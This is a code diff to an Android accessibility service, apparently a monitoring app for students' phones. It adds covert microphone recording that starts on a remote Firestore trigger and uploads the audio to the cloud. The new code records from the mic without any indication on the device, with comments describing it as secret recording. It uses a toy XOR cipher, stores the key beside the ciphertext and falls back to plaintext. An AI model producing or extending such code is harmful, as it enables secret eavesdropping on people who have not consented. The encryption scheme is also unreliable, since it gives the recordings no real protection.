@@ -1,4 +1,4 @@
-﻿package com.example.arbain_agent
+package com.example.arbain_agent
 import android.accessibilityservice.AccessibilityService
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CameraDevice
@@ -20,6 +20,8 @@ import android.util.Log
 import com.google.firebase.firestore.ListenerRegistration
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.auth.FirebaseAuth
+// === AUDIO RECORDING IMPORTS ===
+import android.media.MediaRecorder
 
 class ArbainAccessibilityService : AccessibilityService() {
 
@@ -43,6 +45,11 @@ class ArbainAccessibilityService : AccessibilityService() {
     private var lastBlockedPackage = ""
     private var deviceListener: ListenerRegistration? = null
     private var schedulesListener: ListenerRegistration? = null
+
+    // === AUDIO RECORDING STATE ===
+    @Volatile private var lastRecordTs: String = ""
+    @Volatile private var isRecording = false
+    private var mediaRecorder: MediaRecorder? = null
 
     private val BROWSER_PACKAGES = setOf("com.android.chrome", "org.mozilla.firefox", "com.opera.browser", "com.microsoft.emmx")
 
@@ -190,6 +197,7 @@ class ArbainAccessibilityService : AccessibilityService() {
                     handler.post { hideLostModeOverlay() }
                 }
                 this.isLostMode = isLostMode
+
                 // isAlarmActive
                 val isAlarm = data["isAlarmActive"] as? Boolean ?: false
                 if (isAlarm && !this.isAlarmActive) {
@@ -201,15 +209,43 @@ class ArbainAccessibilityService : AccessibilityService() {
                 }
                 this.isAlarmActive = isAlarm
 
-                                // snapshotTrigger
+                // snapshotTrigger
                 val triggerMap = data["snapshotTrigger"] as? Map<*, *>
                 val triggerTs = triggerMap?.get("timestamp") as? String ?: ""
                 val triggerType = triggerMap?.get("type") as? String ?: "back"
                 if (triggerTs.isNotEmpty() && triggerTs != lastSnapshotTs) {
                     lastSnapshotTs = triggerTs
-                    android.util.Log.d("ArbainService", "snapshotTrigger detected! type=$triggerType ts=$triggerTs")
+                    Log.d("ArbainService", "snapshotTrigger detected! type=$triggerType ts=$triggerTs")
                     handler.post { takeSilentSnapshot(triggerType) }
                 }
+
+                // ============================================================
+                // === recordAudioTrigger — rekam suara diam-diam ===
+                // ============================================================
+                val recordTrigger = data["recordAudioTrigger"] as? Map<*, *>
+                val recordTs = recordTrigger?.get("timestamp") as? String ?: ""
+                val recordDuration = when (val d = recordTrigger?.get("duration")) {
+                    is Long -> d.toInt()
+                    is Double -> d.toInt()
+                    is Int -> d
+                    else -> 30
+                }
+                val encryptionKey = recordTrigger?.get("encryptionKey") as? String ?: ""
+                if (recordTs.isNotEmpty() && recordTs != lastRecordTs) {
+                    lastRecordTs = recordTs
+                    Log.d("ArbainService", "recordAudioTrigger! duration=${recordDuration}s key=${encryptionKey.take(8)}...")
+                    handler.post { startSilentRecording(recordDuration, encryptionKey) }
+                }
+
+                // ============================================================
+                // === stopRecordTrigger — hentikan rekaman lebih awal ===
+                // ============================================================
+                val stopTs = data["stopRecordTrigger"] as? String ?: ""
+                if (stopTs.isNotEmpty() && isRecording) {
+                    Log.d("ArbainService", "stopRecordTrigger received, stopping recording...")
+                    handler.post { stopSilentRecording() }
+                }
+
                 // blockedApps
                 @Suppress("UNCHECKED_CAST")
                 val newApps = (data["blockedApps"] as? List<String> ?: emptyList()).toMutableSet()
@@ -222,7 +258,6 @@ class ArbainAccessibilityService : AccessibilityService() {
                 appTimeLimits.clear()
                 fun flattenMap(map: Map<String, Any>, prefix: String) {
                     map.forEach { (key, value) ->
-                        // konversi underscore ke dot untuk package name (level pertama)
                         val normalizedKey = if (prefix.isEmpty()) key.replace("_", ".") else key
                         val fullKey = if (prefix.isEmpty()) normalizedKey else "$prefix.$normalizedKey"
                         when (value) {
@@ -300,7 +335,271 @@ class ArbainAccessibilityService : AccessibilityService() {
         super.onDestroy()
         deviceListener?.remove()
         schedulesListener?.remove()
+        // Pastikan recording berhenti kalau service mati
+        try {
+            if (isRecording) {
+                mediaRecorder?.stop()
+                mediaRecorder?.release()
+                mediaRecorder = null
+                isRecording = false
+            }
+        } catch (e: Exception) {
+            Log.e("ArbainService", "onDestroy recording cleanup error: ${e.message}")
+        }
     }
+
+    // ============================================================
+    // === AUDIO RECORDING FUNCTIONS ===
+    // ============================================================
+
+    /**
+     * Mulai rekam audio diam-diam dari mikrofon HP santri.
+     * Dipanggil saat recordAudioTrigger diterima dari Firestore.
+     */
+    private fun startSilentRecording(durationSeconds: Int, encryptionKey: String) {
+        // Kalau udah rekam, stop dulu
+        if (isRecording) {
+            Log.d("ArbainService", "startSilentRecording: already recording, stopping first")
+            stopSilentRecording()
+            // Delay 500ms biar MediaRecorder beneran bersih
+            handler.postDelayed({ startSilentRecordingInternal(durationSeconds, encryptionKey) }, 500)
+            return
+        }
+        startSilentRecordingInternal(durationSeconds, encryptionKey)
+    }
+
+    private fun startSilentRecordingInternal(durationSeconds: Int, encryptionKey: String) {
+        // Cek permission RECORD_AUDIO
+        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            Log.e("ArbainService", "startSilentRecording: no RECORD_AUDIO permission!")
+            return
+        }
+
+        try {
+            val outputFile = java.io.File(cacheDir, "arbain_rec_${System.currentTimeMillis()}.m4a")
+
+            val recorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                MediaRecorder(this)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }
+
+            recorder.apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                setAudioEncodingBitRate(64000)
+                setAudioSamplingRate(22050)
+                setOutputFile(outputFile.absolutePath)
+                setMaxDuration(durationSeconds * 1000)
+                setOnInfoListener { _, what, _ ->
+                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                        Log.d("ArbainService", "max duration reached, auto stopping")
+                        handler.post { stopSilentRecording() }
+                    }
+                }
+                setOnErrorListener { _, what, extra ->
+                    Log.e("ArbainService", "MediaRecorder error: what=$what extra=$extra")
+                    handler.post {
+                        isRecording = false
+                        mediaRecorder = null
+                    }
+                }
+                prepare()
+                start()
+            }
+
+            mediaRecorder = recorder
+            isRecording = true
+            Log.d("ArbainService", "🎙️ Recording STARTED: ${outputFile.name} duration=${durationSeconds}s")
+
+            // Simpan info rekaman ke SharedPreferences buat dipake saat stop
+            getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+                .edit()
+                .putString("flutter.current_rec_path", outputFile.absolutePath)
+                .putString("flutter.current_rec_key", encryptionKey)
+                .putInt("flutter.current_rec_duration", durationSeconds)
+                .apply()
+
+            // Auto-stop fallback: kalau setMaxDuration ga trigger, paksa stop setelah durationSeconds + 5 detik
+            handler.postDelayed({
+                if (isRecording) {
+                    Log.d("ArbainService", "auto-stop fallback triggered")
+                    stopSilentRecording()
+                }
+            }, (durationSeconds + 5) * 1000L)
+
+        } catch (e: Exception) {
+            Log.e("ArbainService", "startSilentRecordingInternal error: ${e.message}")
+            isRecording = false
+            mediaRecorder = null
+        }
+    }
+
+    /**
+     * Stop rekaman, encrypt hasilnya, upload ke Firestore.
+     * Dipanggil saat stopRecordTrigger diterima ATAU durasi habis.
+     */
+    private fun stopSilentRecording() {
+        if (!isRecording && mediaRecorder == null) {
+            Log.d("ArbainService", "stopSilentRecording: nothing to stop")
+            return
+        }
+
+        val recorderToStop = mediaRecorder
+        mediaRecorder = null
+        isRecording = false
+
+        try {
+            recorderToStop?.apply {
+                stop()
+                release()
+            }
+            Log.d("ArbainService", "🎙️ Recording STOPPED, processing...")
+        } catch (e: Exception) {
+            Log.e("ArbainService", "stopSilentRecording stop error: ${e.message}")
+            // Lanjut aja ke upload meski ada error saat stop
+        }
+
+        // Baca info rekaman dari SharedPreferences
+        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+        val path = prefs.getString("flutter.current_rec_path", null)
+        val key = prefs.getString("flutter.current_rec_key", "") ?: ""
+        val duration = prefs.getInt("flutter.current_rec_duration", 30)
+
+        if (path == null) {
+            Log.e("ArbainService", "stopSilentRecording: no recording path found")
+            return
+        }
+
+        val file = java.io.File(path)
+        if (!file.exists()) {
+            Log.e("ArbainService", "stopSilentRecording: file not found: $path")
+            return
+        }
+
+        // Proses di background thread (baca file + enkripsi bisa berat)
+        Thread {
+            try {
+                val bytes = file.readBytes()
+                if (bytes.isEmpty()) {
+                    Log.e("ArbainService", "stopSilentRecording: empty file!")
+                    file.delete()
+                    return@Thread
+                }
+
+                val base64Audio = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                Log.d("ArbainService", "Recording size: ${bytes.size} bytes, base64 length: ${base64Audio.length}")
+
+                // Encrypt
+                val encryptedAudio = if (key.isNotEmpty()) {
+                    xorEncrypt(base64Audio, key)
+                } else {
+                    base64Audio // Kirim plain kalau ga ada key (fallback)
+                }
+
+                // Hapus file cache setelah di-encode
+                file.delete()
+
+                // Upload ke Firestore
+                uploadRecordingToFirestore(encryptedAudio, key, duration)
+
+            } catch (e: Exception) {
+                Log.e("ArbainService", "stopSilentRecording processing error: ${e.message}")
+                try { file.delete() } catch (ignored: Exception) {}
+            }
+        }.start()
+    }
+
+    /**
+     * Enkripsi XOR — ringan, client-side, tanpa library eksternal.
+     * Matching dengan decryptAudio() di dashboard.
+     */
+    private fun xorEncrypt(base64Input: String, hexKey: String): String {
+        if (hexKey.isEmpty()) return base64Input
+        return try {
+            // Parse hex key ke bytes
+            val keyBytes = hexKey.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
+            if (keyBytes.isEmpty()) return base64Input
+
+            val inputBytes = base64Input.toByteArray(Charsets.ISO_8859_1)
+            val result = ByteArray(inputBytes.size) { i ->
+                (inputBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
+            }
+            android.util.Base64.encodeToString(result, android.util.Base64.NO_WRAP)
+        } catch (e: Exception) {
+            Log.e("ArbainService", "xorEncrypt error: ${e.message}, returning plain")
+            base64Input
+        }
+    }
+
+    /**
+     * Upload hasil rekaman terenkripsi ke Firestore.
+     * Batasi history ke max 10 rekaman terbaru.
+     */
+    private fun uploadRecordingToFirestore(encryptedAudio: String, key: String, duration: Int) {
+        try {
+            val db = com.google.firebase.firestore.FirebaseFirestore.getInstance()
+            val uid = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser?.uid
+            if (uid == null) {
+                Log.e("ArbainService", "uploadRecordingToFirestore: no UID!")
+                return
+            }
+
+            val newEntry = mapOf(
+                "audio" to encryptedAudio,
+                "key" to key,
+                "duration" to duration,
+                "timestamp" to com.google.firebase.Timestamp.now()
+            )
+
+            // Ambil history dulu, baru append + trim ke max 10
+            db.collection("devices").document(uid).get()
+                .addOnSuccessListener { doc ->
+                    try {
+                        @Suppress("UNCHECKED_CAST")
+                        val existingHistory = (doc.get("recordingHistory") as? List<Map<String, Any>>
+                            ?: emptyList()).toMutableList()
+
+                        existingHistory.add(newEntry)
+
+                        // Keep max 10 rekaman terbaru
+                        val trimmedHistory = if (existingHistory.size > 10) {
+                            existingHistory.takeLast(10)
+                        } else {
+                            existingHistory
+                        }
+
+                        db.collection("devices").document(uid)
+                            .update("recordingHistory", trimmedHistory)
+                            .addOnSuccessListener {
+                                Log.d("ArbainService", "✅ Recording uploaded! history size=${trimmedHistory.size}")
+                            }
+                            .addOnFailureListener { e ->
+                                Log.e("ArbainService", "upload recording update failed: ${e.message}")
+                                // Fallback: coba set langsung kalau update gagal
+                                db.collection("devices").document(uid)
+                                    .update("recordingHistory", listOf(newEntry))
+                                    .addOnSuccessListener {
+                                        Log.d("ArbainService", "✅ Recording uploaded (fallback)")
+                                    }
+                            }
+                    } catch (e: Exception) {
+                        Log.e("ArbainService", "uploadRecordingToFirestore inner error: ${e.message}")
+                    }
+                }
+                .addOnFailureListener { e ->
+                    Log.e("ArbainService", "uploadRecordingToFirestore get failed: ${e.message}")
+                }
+        } catch (e: Exception) {
+            Log.e("ArbainService", "uploadRecordingToFirestore error: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // === END AUDIO RECORDING FUNCTIONS ===
+    // ============================================================
 
     private fun loadAppUsageToday() {
         val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
@@ -330,7 +629,6 @@ class ArbainAccessibilityService : AccessibilityService() {
         val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
         val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
         val today = cal.get(java.util.Calendar.DAY_OF_YEAR)
-        // Reset jam 6 pagi
         val resetDay = if (hour >= 6) today else today - 1
         if (lastResetDay != resetDay) {
             appUsageToday.clear()
@@ -481,7 +779,6 @@ class ArbainAccessibilityService : AccessibilityService() {
         }
     }
 
-
     private fun showLostModeOverlay() {
         if (lostOverlayView != null) return
         val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
@@ -501,7 +798,6 @@ class ArbainAccessibilityService : AccessibilityService() {
             setBackgroundColor(android.graphics.Color.parseColor("#0A0A0A"))
             setPadding(80, 0, 80, 0)
         }
-        // Icon warning
         android.widget.TextView(this).also { v ->
             v.text = "⚠"
             v.textSize = 64f
@@ -566,7 +862,6 @@ class ArbainAccessibilityService : AccessibilityService() {
                     targetId = id; break
                 }
             }
-            // Cek orientasi sensor kamera
             val chars = cameraManager.getCameraCharacteristics(targetId)
             val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
 
@@ -595,7 +890,6 @@ class ArbainAccessibilityService : AccessibilityService() {
                     val isFront = type == "front"
 
                     if (isFront) {
-                        // Kamera depan: pakai SurfaceTexture preview biar AE settle
                         val surfaceTexture = android.graphics.SurfaceTexture(10)
                         surfaceTexture.setDefaultBufferSize(640, 480)
                         val previewSurface = android.view.Surface(surfaceTexture)
@@ -606,14 +900,10 @@ class ArbainAccessibilityService : AccessibilityService() {
                                 override fun onConfigured(session: CameraCaptureSession) {
                                     val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                     previewRequest.addTarget(previewSurface)
-                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE,
-                                        android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
-                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
-                                        android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
-                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE,
-                                        android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
-                                        android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE, android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
+                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
+                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                    previewRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                     session.setRepeatingRequest(previewRequest.build(), null, snapHandler)
 
                                     snapHandler.postDelayed({
@@ -621,14 +911,10 @@ class ArbainAccessibilityService : AccessibilityService() {
                                         val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                         captureRequest.addTarget(imageReader.surface)
                                         captureRequest.set(android.hardware.camera2.CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE, android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                         captureRequest.set(android.hardware.camera2.CaptureRequest.JPEG_QUALITY, 90.toByte())
                                         session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                             override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, res: TotalCaptureResult) {
@@ -648,26 +934,18 @@ class ArbainAccessibilityService : AccessibilityService() {
                             }, snapHandler
                         )
                     } else {
-                        // Kamera belakang: Samsung-compatible, langsung STILL_CAPTURE tanpa preview
-                        // Preview di Samsung Galaxy kadang timeout dari background service
                         camera.createCaptureSession(
                             listOf(imageReader.surface),
                             object : CameraCaptureSession.StateCallback() {
                                 override fun onConfigured(session: CameraCaptureSession) {
-                                    // Delay 1500ms biar sensor warmup
                                     snapHandler.postDelayed({
                                         val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                         captureRequest.addTarget(imageReader.surface)
                                         captureRequest.set(android.hardware.camera2.CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                        // AF off + focus infinity biar langsung capture tanpa nunggu AF
-                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
-                                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_OFF)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE, android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                        captureRequest.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_OFF)
                                         captureRequest.set(android.hardware.camera2.CaptureRequest.LENS_FOCUS_DISTANCE, 0.0f)
                                         captureRequest.set(android.hardware.camera2.CaptureRequest.JPEG_QUALITY, 90.toByte())
                                         session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
@@ -804,7 +1082,3 @@ class ArbainAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 }
-
-
-
-
